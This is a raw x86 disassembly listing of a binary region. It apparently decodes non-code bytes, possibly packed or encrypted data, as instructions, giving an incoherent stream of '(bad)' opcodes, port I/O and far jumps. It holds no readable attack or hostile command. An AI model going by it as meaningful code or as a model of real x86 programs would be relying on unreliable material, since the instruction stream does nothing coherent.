  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	lea    esp,[ecx-0x3375cae7]
  41ed74:	std    
  41ed75:	and    esp,DWORD PTR [ebp+0x2e]
  41ed78:	call   0x7b6c9e29
  41ed7d:	ror    BYTE PTR ds:0x4898e6f3,1
  41ed83:	pop    ds
  41ed84:	sar    ebx,cl
  41ed86:	int3   
  41ed87:	mov    ds:0xc22a0a17,eax
  41ed8c:	dec    edx
  41ed8d:	or     ebx,DWORD PTR [ebx-0x633ee1ee]
  41ed93:	adc    al,0x8f
  41ed95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed96:	xlat   BYTE PTR ds:[ebx]
  41ed97:	(bad)  
  41ed99:	jg     0x41ee04
  41ed9b:	mov    esp,0xb08b84fd
  41eda0:	xchg   DWORD PTR [esi+edx*8],edi
  41eda3:	das    
  41eda4:	jae    0x41edb3
  41eda6:	inc    esp
  41eda7:	mov    al,ds:0x8d475e27
  41edac:	(bad)  
  41edad:	rcl    DWORD PTR [ebp+eiz*1+0x52],1
  41edb1:	in     eax,dx
  41edb2:	inc    ebx
  41edb3:	mov    cl,0xb0
  41edb5:	xor    eax,0x46e98780
  41edba:	or     ecx,edx
  41edbc:	unpckhps xmm1,xmm3
  41edbf:	push   0xfffffff0
  41edc1:	jge    0x41edac
  41edc3:	lods   al,BYTE PTR ds:[esi]
  41edc4:	cwde   
  41edc5:	or     al,0xc4
  41edc7:	and    ebp,DWORD PTR [eax+edx*2-0x2d]
  41edcb:	and    bl,dl
  41edcd:	sbb    DWORD PTR [edx],esp
  41edcf:	mul    DWORD PTR [esi+0xd]
  41edd2:	cwde   
  41edd3:	hlt    
  41edd4:	gs cmp eax,0xc1064d5c
  41edda:	dec    BYTE PTR [ebx+0x70]
  41eddd:	popf   
  41edde:	dec    edi
  41eddf:	out    0x6d,al
  41ede1:	lds    edx,FWORD PTR [esi+0x76]
  41ede4:	jg     0x41ee5e
  41ede6:	push   ds
  41ede7:	in     eax,dx
  41ede8:	sar    BYTE PTR [ebx+0x798153bf],0x50
  41edef:	scas   al,BYTE PTR es:[edi]
  41edf0:	dec    edx
  41edf1:	(bad)
  41edf4:	jo     0x41ee14
  41edf6:	jg     0x41edd1
  41edf8:	pop    edi
  41edf9:	out    0x20,eax
  41edfb:	and    bl,BYTE PTR [eax]
  41edfd:	sbb    DWORD PTR [esp+ecx*2-0xe90b1e9],ebx
  41ee04:	aas    
  41ee05:	mov    ebx,0xcd7a8461
  41ee0a:	pop    esi
  41ee0b:	push   es
  41ee0c:	or     cl,BYTE PTR [ecx+0x59]
  41ee0f:	sub    DWORD PTR [ebp-0x2583da71],0x314f3af2
  41ee19:	lods   eax,DWORD PTR ds:[esi]
  41ee1a:	(bad)  [esp+ecx*8-0x4d544088]
  41ee21:	pop    ebx
  41ee22:	and    DWORD PTR [ecx],ebx
  41ee24:	cdq    
  41ee25:	out    0x16,al
  41ee27:	mov    ds:0x39b4e1df,al
  41ee2c:	inc    eax
  41ee2d:	call   0xfb43319
  41ee32:	ret    
  41ee33:	xchg   esi,eax
  41ee34:	mov    dh,0x93
  41ee36:	xchg   esi,eax
  41ee37:	mov    ch,0x57
  41ee39:	adc    BYTE PTR [edx+0x2809027d],dh
  41ee3f:	test   dh,bl
  41ee41:	lahf   
  41ee42:	jne    0x41ee22
  41ee44:	inc    esp
  41ee45:	dec    esi
  41ee46:	mov    ecx,0x8ffb5487
  41ee4b:	jge    0x41eeb2
  41ee4d:	mov    edi,0xcc485776
  41ee52:	lods   eax,DWORD PTR ds:[esi]
  41ee53:	inc    edi
  41ee54:	pop    ss
  41ee55:	ins    DWORD PTR es:[edi],dx
  41ee56:	icebp  
  41ee57:	repnz xor BYTE PTR [edx+0xe],dl
  41ee5b:	xchg   ah,cl
  41ee5d:	adc    BYTE PTR [eax],ch
  41ee5f:	or     dl,BYTE PTR [ecx]
  41ee61:	mov    ds:0xd15ce54e,eax
  41ee66:	mov    eax,ds:0xf03df3bd
  41ee6b:	stc    
  41ee6c:	stos   DWORD PTR es:[edi],eax
  41ee6d:	add    BYTE PTR ds:[eax],al
	...
  41eed4:	add    BYTE PTR [eax],al
  41eed6:	add    eax,0x7b197956
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x6734:0x8676ee7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	mov    bl,0xbf
  41eef0:	out    dx,al
  41eef1:	add    ah,0xc2
  41eef4:	fcmovbe st,st(6)
  41eef6:	inc    eax
  41eef7:	pop    es
  41eef8:	push   es
  41eef9:	jecxz  0x41eec7
  41eefb:	sub    al,0x89
  41eefd:	ret    0x5eb2
  41ef00:	sahf   
  41ef01:	xchg   edx,eax
  41ef02:	pop    edi
  41ef03:	int3   
  41ef04:	pop    ss
  41ef05:	mov    cl,0xcb
  41ef08:	test   al,0xd1
  41ef0a:	retf   
  41ef0b:	sahf   
  41ef0c:	scas   eax,DWORD PTR es:[edi]
  41ef0d:	or     DWORD PTR [esi],0xffffff89
  41ef10:	aaa    
  41ef11:	rcl    DWORD PTR [ebp+0x797078b3],1
  41ef17:	sbb    bl,ch
  41ef19:	push   eax
  41ef1a:	fisubr WORD PTR [ecx*2-0x487c016d]
  41ef21:	test   eax,0xfb40e715
  41ef26:	push   0xc5a9e1d9
  41ef2b:	pop    es
  41ef2c:	dec    ecx
  41ef2d:	add    DWORD PTR [ebx],ebx
  41ef2f:	call   0x8772:0xfd5bd397
  41ef36:	aam    0xbb
  41ef38:	fcom   DWORD PTR [ebp-0x50]
  41ef3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef3c:	mov    esp,0x75a2d3e1
  41ef41:	or     DWORD PTR [edx+0x2b],ebx
  41ef44:	add    ch,cl
  41ef46:	pop    edi
  41ef47:	add    BYTE PTR [esp+ecx*8],bl
  41ef4a:	jnp    0x41ef8b
  41ef4c:	aam    0xa0
  41ef4e:	mov    dl,0xf8
  41ef50:	dec    ecx
  41ef51:	sub    DWORD PTR [esi-0x65],esi
  41ef54:	cdq    
  41ef55:	jno    0x41eef5
  41ef57:	stos   BYTE PTR es:[edi],al
  41ef58:	enter  0xf6a0,0xaa
  41ef5c:	dec    eax
  41ef5d:	jg     0x41efa7
  41ef5f:	data16 loop 0x41ef90
  41ef62:	pop    esi
  41ef63:	inc    eax
  41ef64:	retf   0xb186
  41ef67:	ins    DWORD PTR es:[edi],dx
  41ef68:	push   edi
  41ef69:	(bad)  
  41ef6b:	inc    edx
  41ef6c:	in     al,dx
  41ef6d:	xchg   ebp,eax
  41ef6e:	xlat   BYTE PTR ds:[ebx]
  41ef6f:	mov    ecx,0xe7b96140
  41ef74:	dec    esp
  41ef75:	pusha  
  41ef76:	jns    0x41ef74
  41ef78:	xor    bl,BYTE PTR [ebx-0x49]
  41ef7b:	lahf   
  41ef7c:	jb     0x41ef07
  41ef7e:	add    eax,0xedf32588
  41ef83:	xchg   ebx,eax
  41ef84:	jb     0x41ef0a
  41ef86:	es or  eax,esp
  41ef89:	jb     0x41efd6
  41ef8b:	adc    DWORD PTR [edx+0x14],edx
  41ef8e:	mov    DWORD PTR [edx+eiz*8+0x3aa1534a],ebp
  41ef95:	dec    eax
  41ef96:	ins    BYTE PTR es:[edi],dx
  41ef97:	ret    0x65e6
  41ef9a:	jmp    0xe6df46d3
  41ef9f:	in     al,dx
  41efa0:	lock sbb al,0x3a
  41efa3:	ins    DWORD PTR es:[edi],dx
  41efa4:	jle    0x41ef9d
  41efa6:	mov    ebp,0xc5991836
  41efab:	sub    BYTE PTR [edx+0x1ac5a4b1],ch
  41efb1:	pop    ss
  41efb2:	ret    
  41efb3:	mov    al,0x52
  41efb5:	jmp    0x1955:0x47ea5d3b
  41efbc:	sti    
  41efbd:	jmp    0x7a9e757c
  41efc2:	repnz inc eax
  41efc4:	cmp    ebp,esi
  41efc6:	push   cs
  41efc7:	cmp    al,0xda
  41efc9:	outs   dx,BYTE PTR ds:[esi]
  41efca:	popa   
  41efcb:	fwait
  41efcc:	sub    al,0x85
  41efce:	stc    
  41efcf:	add    eax,0x6b629454
  41efd4:	cmp    edi,DWORD PTR [ecx]
  41efd6:	sub    al,0xb6
  41efd8:	pop    ebp
  41efd9:	test   eax,0x7933a340
  41efde:	aaa    
  41efdf:	push   esp
  41efe0:	push   ebp
  41efe1:	sbb    BYTE PTR [edx-0x498b95],dl
  41efe7:	sti    
  41efe8:	call   0x30:0x9ea89048
	...
  41f053:	add    BYTE PTR [eax],al
  41f055:	add    BYTE PTR [ecx-0xda40a3],bh
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul ebx,edx,0xffffffbb
  41f064:	fsub   DWORD PTR [ecx]
  41f066:	addr16 dec ebp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	ss mov bh,0xdf
  41f071:	fdiv   DWORD PTR [edi+0x5de8564e]
  41f077:	inc    edi
  41f078:	fstp   QWORD PTR [edi-0x60]
  41f07b:	outs   dx,BYTE PTR ds:[esi]
  41f07c:	mov    DWORD PTR [edi+0x1c023281],esp
  41f082:	cmp    bh,bh
  41f084:	push   0x23b280a8
  41f089:	sub    BYTE PTR [esi+0x5b],ah
  41f08c:	arpl   WORD PTR [edi-0x3e337f56],cx
  41f092:	fs push ebp
  41f094:	jp     0x41f108
  41f096:	jmp    0x41f0f0
  41f098:	jne    0x41f047
  41f09a:	shl    DWORD PTR [eax-0x5f],cl
  41f09d:	je     0x41f05b
  41f09f:	jns    0x41f060
  41f0a1:	add    esp,0x4e974ff6
  41f0a7:	sahf   
  41f0a8:	add    eax,0xd8c94d68
  41f0ad:	in     eax,0x8c
  41f0af:	(bad)  
  41f0b0:	fistp  WORD PTR [ebp+0x5f260404]
  41f0b6:	and    DWORD PTR [ecx],0xffffffe9
  41f0b9:	xchg   edx,eax
  41f0ba:	pop    ebp
  41f0bb:	pop    ebp
  41f0bc:	jg     0x41f0f8
  41f0be:	dec    ebp
  41f0bf:	imul   eax,DWORD PTR [ecx-0xd],0xffffffd2
  41f0c3:	scas   eax,DWORD PTR es:[edi]
  41f0c4:	ror    DWORD PTR [ecx-0x6d],cl
  41f0c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0c8:	adc    eax,0x2f22a752
  41f0cd:	mov    dh,BYTE PTR [edi]
  41f0cf:	xchg   BYTE PTR [eax-0x70],al
  41f0d2:	retf   0x6764
  41f0d5:	inc    esp
  41f0d6:	cmp    DWORD PTR [ebp-0x7e],ebp
  41f0d9:	push   cs
  41f0da:	jge    0x41f084
  41f0dc:	(bad)  
  41f0dd:	adc    DWORD PTR [edi],eax
  41f0df:	rol    DWORD PTR [ecx-0x359fc138],0x24
  41f0e6:	in     al,0x6d
  41f0e8:	inc    ecx
  41f0e9:	jae    0x41f0c8
  41f0eb:	cmp    al,0x9f
  41f0ed:	or     dh,BYTE PTR [esi]
  41f0ef:	imul   esp,DWORD PTR [eax],0x9124c88e
  41f0f5:	lods   eax,DWORD PTR ds:[esi]
  41f0f6:	outs   dx,DWORD PTR ds:[esi]
  41f0f7:	add    DWORD PTR [edi],eax
  41f0f9:	clc    
  41f0fa:	jl     0x41f0b4
  41f0fc:	jb     0x41f172
  41f0fe:	cmp    ecx,ebx
  41f100:	(bad)  
  41f101:	clc    
  41f102:	jmp    0x41f183
  41f104:	jmp    0xde933273
  41f109:	push   edx
  41f10a:	pop    edi
  41f10b:	mov    edx,0x38fe18f3
  41f110:	cs imul ebp,ecx,0x52
  41f114:	addr16 fxch st(7)
  41f117:	(bad)
  41f11a:	cwde   
  41f11b:	aas    
  41f11c:	push   ecx
  41f11d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f11e:	mov    bh,0xae
  41f120:	imul   ebx,DWORD PTR ds:0xb9095313,0x3a689335
  41f12a:	xor    ch,dh
  41f12c:	xor    dl,BYTE PTR [edi+0xcd58432]
  41f132:	mov    ebx,0x45410175
  41f137:	call   0x53f9:0x81e5a02c
  41f13e:	adc    cl,BYTE PTR [edx+0x96af624]
  41f144:	dec    ebp
  41f145:	sbb    dh,BYTE PTR [edi]
  41f147:	mov    esp,0xf9cb9aec
  41f14c:	ret    0x5619
  41f14f:	iret   
  41f150:	jb     0x41f138
  41f152:	lods   al,BYTE PTR ds:[esi]
  41f153:	sbb    al,BYTE PTR [ecx]
  41f155:	mov    dl,0xb1
  41f157:	sbb    al,0x0
  41f159:	mov    dl,0xde
  41f15b:	ins    DWORD PTR es:[edi],dx
  41f15c:	adc    BYTE PTR [ebx+0x604880f0],0x54
  41f163:	out    dx,eax
  41f164:	test   eax,0x7286777
  41f169:	jge    0x41f11a
  41f16b:	xchg   esi,eax
  41f16c:	adc    edi,ecx
	...
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0xf9be5bf3
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	xor    al,BYTE PTR [edx+0x6b]
  41f1f1:	pop    ds
  41f1f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1f3:	push   ebx
  41f1f4:	mov    bh,0x91
  41f1f6:	in     eax,dx
  41f1f7:	and    esi,DWORD PTR [edx+ebx*2]
  41f1fa:	mov    dl,0x81
  41f1fc:	scas   al,BYTE PTR es:[edi]
  41f1fd:	or     al,0xe4
  41f1ff:	cmp    bl,dh
  41f201:	push   ds
  41f202:	int    0x37
  41f204:	test   DWORD PTR [ebp+0x71],ecx
  41f207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f208:	adc    al,0x75
  41f20a:	adc    ah,BYTE PTR [eax+0xc]
  41f20d:	and    dh,al
  41f20f:	dec    eax
  41f210:	jmp    0xa60ce17c
  41f215:	fisubr DWORD PTR [esi+0x1aae191c]
  41f21b:	sub    BYTE PTR [ebx-0x227840d1],al
  41f221:	pop    edx
  41f222:	push   cs
  41f223:	pop    edx
  41f224:	jl     0x41f28f
  41f226:	rcr    DWORD PTR [edi+0x7c8d86e1],cl
  41f22c:	out    dx,al
  41f22d:	fs push ebp
  41f22f:	in     al,0xc7
  41f231:	imul   eax,DWORD PTR [ecx-0x51],0x5c41da1f
  41f238:	stos   DWORD PTR es:[edi],eax
  41f239:	push   ss
  41f23a:	mov    eax,0x7a1a2316
  41f23f:	out    0x14,al
  41f241:	fxch   st(0)
  41f243:	icebp  
  41f244:	or     al,dh
  41f246:	pop    edi
  41f247:	jmp    WORD PTR [ebp-0x72]
  41f24b:	es jmp 0xda80:0x2cc5ec9f
  41f253:	sub    al,BYTE PTR [ebx-0x40]
  41f256:	popf   
  41f257:	sar    DWORD PTR [edx-0x6f],1
  41f25a:	mov    BYTE PTR ds:0xcba39444,bl
  41f260:	jmp    0xcb2b:0xf02feee6
  41f267:	xchg   DWORD PTR [edx-0x5a6d452c],esi
  41f26d:	push   0xffffffab
  41f26f:	dec    esi
  41f270:	push   es
  41f271:	adc    BYTE PTR [ebx],al
  41f273:	enter  0x71dd,0xd7
  41f277:	cmc    
  41f278:	xlat   BYTE PTR ds:[ebx]
  41f279:	mov    esp,0xb40599e5
  41f27e:	push   esi
  41f27f:	xchg   ebx,eax
  41f280:	inc    ebx
  41f281:	dec    ebx
  41f282:	xchg   ecx,eax
  41f283:	push   esp
  41f284:	(bad)
  41f287:	je     0x41f24a
  41f289:	sbb    al,0xaa
  41f28b:	mov    esp,0x915041a4
  41f290:	jne    0x41f246
  41f292:	cmp    DWORD PTR [edx+0x9d49981],esi
  41f298:	into   
  41f299:	sbb    BYTE PTR [esi+0x72ce12a4],ch
  41f29f:	mov    esi,DWORD PTR [esi]
  41f2a1:	push   cs
  41f2a2:	in     eax,0xb1
  41f2a4:	adc    ebx,DWORD PTR gs:0x5fa9145f
  41f2ab:	retf   
  41f2ac:	adc    ecx,DWORD PTR [esi+0x60]
  41f2af:	cmp    al,0x43
  41f2b1:	jbe    0x41f255
  41f2b3:	loopne 0x41f23b
  41f2b5:	lods   eax,DWORD PTR ds:[esi]
  41f2b6:	popa   
  41f2b7:	ret    0xe713
  41f2ba:	jmp    0xec86:0x53dc3c9a
  41f2c1:	xor    al,0xe6
  41f2c3:	lods   al,BYTE PTR ds:[esi]
  41f2c4:	xchg   esp,eax
  41f2c5:	test   eax,0x6f435744
  41f2ca:	or     al,0x99
  41f2cc:	inc    edx
  41f2cd:	or     al,0x0
  41f2cf:	sbb    DWORD PTR [ebx-0x60],ecx
  41f2d2:	push   eax
  41f2d3:	push   edx
  41f2d4:	test   DWORD PTR [esi],ecx
  41f2d6:	push   0x7a4b4099
  41f2db:	adc    eax,0x50e34db9
  41f2e0:	pop    ss
  41f2e1:	addr16 push edi
  41f2e3:	mov    ds:0x14e0aa57,al
  41f2e8:	aam    0xa7
  41f2ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2eb:	sbb    esp,DWORD PTR [esi-0x3d]
	...
  41f356:	push   ecx
  41f357:	sbb    edi,edi
  41f359:	jmp    si
  41f35c:	fnstcw WORD PTR [edi]
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f2f6
  41f363:	cs cli 
  41f365:	(bad)  
  41f366:	addr16 dec edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	in     eax,0x24
  41f370:	daa    
  41f371:	cmp    ch,BYTE PTR [esi+0x539278b7]
  41f377:	mov    ah,0xf4
  41f379:	mov    ah,0x12
  41f37b:	and    BYTE PTR [edx+0x11],dl
  41f37e:	dec    edi
  41f37f:	cmp    al,0xb9
  41f381:	push   0x52970b35
  41f386:	adc    al,BYTE PTR [ecx-0x71a6c62f]
  41f38c:	mov    edx,0x43b07bae
  41f391:	sbb    DWORD PTR [edx-0x10],ecx
  41f394:	jl     0x41f348
  41f396:	mov    ch,0xd6
  41f398:	std    
  41f399:	(bad)  [ecx+0x6b]
  41f39c:	cmp    al,0xfc
  41f39e:	jecxz  0x41f3d2
  41f3a0:	inc    edi
  41f3a1:	inc    esi
  41f3a2:	into   
  41f3a3:	fbstp  TBYTE PTR [esi]
  41f3a5:	pusha  
  41f3a6:	push   ss
  41f3a7:	in     al,dx
  41f3a8:	pusha  
  41f3a9:	push   es
  41f3aa:	mov    DWORD PTR [edx+ecx*2-0x5f356d99],ecx
  41f3b1:	mov    ah,0xa5
  41f3b3:	outs   dx,BYTE PTR ds:[esi]
  41f3b4:	pop    eax
  41f3b5:	xor    esi,DWORD PTR [eax-0x35fa7120]
  41f3bb:	mov    WORD PTR [ecx],ss
  41f3bd:	scas   eax,DWORD PTR es:[edi]
  41f3be:	or     al,0xa9
  41f3c0:	test   DWORD PTR [eax],eax
  41f3c2:	test   edi,edx
  41f3c4:	div    BYTE PTR [eax]
  41f3c6:	retf   
  41f3c7:	arpl   WORD PTR [edi+0x14d7f44c],ax
  41f3cd:	mov    al,0x65
  41f3cf:	xchg   cl,dh
  41f3d1:	push   eax
  41f3d2:	push   edi
  41f3d3:	enter  0xcdcb,0x3a
  41f3d7:	cmp    eax,0xc085af9f
  41f3dc:	adc    eax,0x3236a41b
  41f3e1:	ss mov bl,0x5e
  41f3e4:	repnz (bad) 
  41f3e6:	ds or  al,0x72
  41f3e9:	dec    edi
  41f3ea:	fnstcw WORD PTR [edi+0x326765c1]
  41f3f0:	fiadd  DWORD PTR [edi+0x30]
  41f3f3:	xor    ecx,DWORD PTR [edx]
  41f3f5:	mov    ds:0x71b74ed4,al
  41f3fa:	sahf   
  41f3fb:	inc    esp
  41f3fc:	clc    
  41f3fd:	add    bh,BYTE PTR [esi+0x3a6b9e23]
  41f403:	sub    eax,0x81f02d6
  41f408:	xchg   ebx,eax
  41f409:	in     al,0xe
  41f40b:	pop    ecx
  41f40c:	das    
  41f40d:	in     eax,dx
  41f40e:	call   0xc27e:0x32e74381
  41f415:	int3   
  41f416:	xchg   ebx,edi
  41f418:	bound  esp,QWORD PTR [ebp-0x7aec1e99]
  41f41e:	or     al,0xee
  41f420:	pop    ss
  41f421:	iret   
  41f422:	inc    ecx
  41f423:	pop    esp
  41f424:	mov    BYTE PTR [esi+0x17],ah
  41f427:	or     bh,bl
  41f429:	mov    DWORD PTR [edi+esi*2],edi
  41f42c:	xor    eax,ebp
  41f42e:	call   0x7503:0xc1259bcf
  41f435:	jno    0x41f46e
  41f437:	dec    BYTE PTR ds:0xc7a5bbaf
  41f43d:	pop    ecx
  41f43e:	pop    esp
  41f43f:	xchg   ebx,eax
  41f440:	out    0x69,al
  41f442:	mov    dh,0xc8
  41f444:	arpl   WORD PTR ds:0xcc278f41,ax
  41f44a:	jno    0x41f4c0
  41f44c:	xlat   BYTE PTR ds:[ebx]
  41f44d:	lea    esp,[ecx+0x25053af1]
  41f453:	in     eax,dx
  41f454:	add    dh,BYTE PTR [eax-0x68a548b9]
  41f45a:	push   edi
  41f45b:	in     al,dx
  41f45c:	xor    BYTE PTR [edi-0x11c1f4df],ah
  41f462:	out    0xa6,al
  41f464:	push   esi
  41f465:	imul   edi,DWORD PTR [eax+0xd],0xffffffe2
  41f469:	in     al,dx
  41f46a:	(bad)  
  41f46b:	ret    0x7c1b
	...
  41f4d6:	cmp    al,0xe7
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0x9a
  41f4e3:	cmp    al,0xf4
  41f4e5:	inc    edx
  41f4e6:	addr16 push eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	dec    ecx
  41f4ef:	sub    BYTE PTR [edx-0x15703552],dl
  41f4f5:	or     DWORD PTR [ebx],esi
  41f4f7:	mov    cl,0x9b
  41f4f9:	push   esp
  41f4fa:	xor    DWORD PTR [eax+0xc],ecx
  41f4fd:	mov    bl,0x9b
  41f4ff:	push   es
  41f500:	dec    edi
  41f501:	pop    ebp
  41f502:	and    bh,BYTE PTR [edx-0x29fb67d1]
  41f508:	and    eax,0x39b53f8e
  41f50d:	cli    
  41f50e:	cmp    cl,BYTE PTR [esp+eiz*8]
  41f511:	stos   BYTE PTR es:[edi],al
  41f512:	std    
  41f513:	aaa    
  41f514:	daa    
  41f515:	push   edi
  41f516:	test   dh,0x77
  41f519:	jmp    0x41f4d6
  41f51b:	lea    eax,[esi]
  41f51d:	adc    eax,0xf318d570
  41f522:	cmp    al,0x6e
  41f524:	xchg   ecx,eax
  41f525:	lea    eax,[ebp+0x1df4d184]
  41f52b:	dec    ecx
  41f52c:	js     0x41f558
  41f52e:	aaa    
  41f52f:	or     esp,DWORD PTR [esi+0x6f]
  41f532:	scas   eax,DWORD PTR es:[edi]
  41f533:	or     al,0x63
  41f535:	popa   
  41f536:	cmp    ah,bh
  41f538:	mov    edi,gs
  41f53a:	or     BYTE PTR [edx+0x1828630c],0x21
  41f541:	sti    
  41f542:	leave  
  41f543:	add    al,0x51
  41f545:	iret   
  41f546:	loope  0x41f4c8
  41f548:	shl    ah,0x5a
  41f54b:	stc    
  41f54c:	sahf   
  41f54d:	test   DWORD PTR [eax],edx
  41f54f:	int    0xa2
  41f551:	jmp    0xe3c31237
  41f556:	fwait
  41f557:	(bad)  
  41f558:	in     eax,0x1d
  41f55a:	fistp  DWORD PTR [edi]
  41f55c:	or     esi,DWORD PTR ds:0x4716b3ca
  41f562:	pop    edi
  41f563:	mov    esi,0x23c78749
  41f568:	inc    eax
  41f569:	call   0xca401e7b
  41f56e:	in     al,dx
  41f56f:	jmp    0x6b63cc70
  41f574:	fsubp  st(7),st
  41f576:	jg     0x41f5d7
  41f578:	sti    
  41f579:	jg     0x41f57d
  41f57b:	jge    0x41f594
  41f57d:	mov    esi,0x2dae28d5
  41f582:	mov    eax,0x6ba387df
  41f587:	dec    edi
  41f588:	aas    
  41f589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f58a:	mov    ds,esi
  41f58c:	xor    DWORD PTR [edx+0x30],eax
  41f58f:	fnstenv ds:0x5554beab
  41f595:	mov    ds:0xa8649af0,al
  41f59a:	push   ds
  41f59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f59c:	cmp    eax,eax
  41f59e:	push   esi
  41f59f:	mov    al,ds:0xc51bd04f
  41f5a4:	fwait
  41f5a5:	inc    eax
  41f5a6:	cmc    
  41f5a7:	mov    ecx,0x271c08a8
  41f5ac:	mov    WORD PTR [esi],ds
  41f5ae:	inc    eax
  41f5af:	cmp    ecx,DWORD PTR [esp+ecx*8+0x12161ead]
  41f5b6:	sbb    BYTE PTR [ebx],ch
  41f5b8:	cmp    DWORD PTR [ebp-0x4b2ad0c3],0x89faa781
  41f5c2:	cmp    al,0x29
  41f5c4:	jbe    0x41f5a7
  41f5c6:	push   ecx
  41f5c7:	call   0xd65acf1e
  41f5cc:	scas   eax,DWORD PTR es:[edi]
  41f5cd:	fcom   QWORD PTR [edi-0x21]
  41f5d0:	in     eax,dx
  41f5d1:	bound  edi,QWORD PTR [esi]
  41f5d3:	loope  0x41f557
  41f5d5:	nop
  41f5d6:	and    DWORD PTR [ebx],ebp
  41f5d8:	dec    esp
  41f5d9:	inc    edx
  41f5da:	add    eax,0xe2d85307
  41f5df:	mov    edx,0x740c7b9e
  41f5e4:	add    BYTE PTR [edi+0x42fe51a2],bh
  41f5ea:	out    dx,eax
  41f5eb:	mov    ch,0x74
  41f5ed:	xchg   esi,eax
	...
  41f656:	js     0x41f68c
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x5fe4:0xecb3d422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	xor    edi,DWORD PTR [eax-0x2c]
  41f671:	mov    bh,0xeb
  41f673:	test   al,0x8
  41f675:	call   0x60ecbf3
  41f67a:	adc    DWORD PTR [ebp-0x4b3714ff],ebp
  41f680:	jecxz  0x41f6b0
  41f682:	xchg   DWORD PTR [ebx+0x6fa5215f],esi
  41f688:	xchg   DWORD PTR [edx+0x25e8d173],eax
  41f68e:	push   0x3b6f6efd
  41f693:	mov    gs,WORD PTR [edi]
  41f695:	jl     0x41f691
  41f697:	mov    WORD PTR [edx+0x119202f4],ss
  41f69d:	repnz nop
  41f69f:	pusha  
  41f6a0:	mov    ?,WORD PTR [edx]
  41f6a2:	bound  esp,QWORD PTR ds:0x489ed2af
  41f6a8:	cli    
  41f6a9:	retf   0xd42c
  41f6ac:	gs sahf 
  41f6ae:	outs   dx,BYTE PTR ds:[esi]
  41f6af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6b0:	or     BYTE PTR [eax+ebp*4],dh
  41f6b3:	mov    dl,BYTE PTR [eax-0x61abbbd2]
  41f6b9:	shl    DWORD PTR [ecx+ecx*4-0x6afbf301],1
  41f6c0:	jmp    0xa9ed:0x1cf4471d
  41f6c7:	sub    eax,0xcc75d171
  41f6cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6cd:	cmp    al,0xf4
  41f6cf:	(bad)  
  41f6d0:	ja     0x41f688
  41f6d2:	adc    BYTE PTR [ebp-0x507dbf01],bl
  41f6d8:	cmp    cl,BYTE PTR [ebx]
  41f6da:	inc    ecx
  41f6db:	push   edx
  41f6dc:	outs   dx,DWORD PTR ds:[esi]
  41f6dd:	das    
  41f6de:	lods   eax,DWORD PTR ds:[esi]
  41f6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6e0:	jmp    0x41f6c3
  41f6e2:	ret    0xffa
  41f6e5:	adc    cl,BYTE PTR [edi+0x618a6de3]
  41f6eb:	sub    esi,DWORD PTR [edx]
  41f6ed:	ror    DWORD PTR [edi+0x6e024842],0x73
  41f6f4:	test   al,0xb8
  41f6f6:	jae    0x41f749
  41f6f8:	inc    esi
  41f6f9:	rcl    DWORD PTR [esi],0x9d
  41f6fc:	pop    eax
  41f6fd:	cwde   
  41f6fe:	jns    0x41f69a
  41f700:	imul   ecx,DWORD PTR [eax-0x3b],0xa1a6c11d
  41f707:	cld    
  41f708:	ret    0xee24
  41f70b:	test   al,0x3
  41f70d:	in     eax,0xbe
  41f70f:	mov    al,ds:0x1eabaed2
  41f714:	aaa    
  41f715:	cmc    
  41f716:	retf   0xf1a2
  41f719:	aaa    
  41f71a:	(bad)
  41f71f:	mov    ch,0x6d
  41f721:	shl    DWORD PTR ss:[ecx-0x5e],0x14
  41f726:	pop    eax
  41f727:	(bad)  
  41f728:	fiadd  WORD PTR ds:0xb6c904bc
  41f72e:	loop   0x41f6c4
  41f730:	xor    BYTE PTR [eax],0x9e
  41f733:	out    dx,al
  41f734:	ret    
  41f735:	enter  0xb827,0xb9
  41f739:	or     edi,DWORD PTR [eax+esi*4+0x7f5795e1]
  41f740:	clc    
  41f741:	mov    eax,ds:0x9c8ff713
  41f746:	into   
  41f747:	fmul   st(5),st
  41f749:	mov    fs,ebp
  41f74b:	jns    0x41f6fe
  41f74d:	push   ebp
  41f74e:	sbb    eax,0x11d6e970
